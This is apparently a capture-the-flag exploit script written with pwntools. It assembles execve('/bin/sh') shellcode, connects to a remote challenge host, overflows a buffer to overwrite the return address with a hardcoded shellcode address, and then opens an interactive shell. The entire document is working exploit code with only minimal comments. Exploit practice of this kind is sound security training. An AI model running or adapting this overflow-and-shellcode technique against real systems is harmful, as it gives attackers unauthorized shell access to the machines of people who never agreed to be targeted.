###Simple Shellcode + Overflow###

from pwn import *

###Useful address 
shellcode_addr = 0x601079

###Useful string
# /  b  i  n  /  s  h \x00
# 2f 62 69 6e 2f 73 68 00

###shellcode
context.arch = 'amd64'

shellcode = asm("""
                mov rdi, 0x0068732f6e69622f
                push rdi
                mov rdi, rsp
                xor rsi, rsi
                xor rdx, rdx
                mov rax, 0x3b
                syscall
                """)


r = remote('chall2.ctfs.me',2010)

###overflow return address to shellcoe position
r.sendafter('your name: ',b'a'*0x18+p64(shellcode_addr))

###write shellcode
r.sendafter('your story: ',shellcode)
r.interactive()
